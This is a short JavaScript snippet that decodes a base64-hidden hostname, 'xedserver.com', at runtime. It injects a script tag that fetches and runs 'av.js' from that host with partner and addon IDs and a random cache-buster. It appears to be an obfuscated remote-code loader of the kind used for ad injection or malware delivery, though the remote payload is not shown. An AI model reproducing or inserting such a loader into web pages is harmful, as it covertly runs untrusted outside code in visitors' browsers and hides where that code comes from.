(function() {
	var base = atob('eGVkc2VydmVyLmNvbQ==');
	var partner = ['sub73'];
	var addon = ['av73302'];
	var av_r = Math.floor(Math.random() * (9999999999 - 1 + 1)) + 1;
	var head = document.getElementsByTagName('head')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = '//'+base+'/build/'+partner[0]+'/'+addon[0]+'/av.js?cb='+av_r;
	head.appendChild(script);
})();
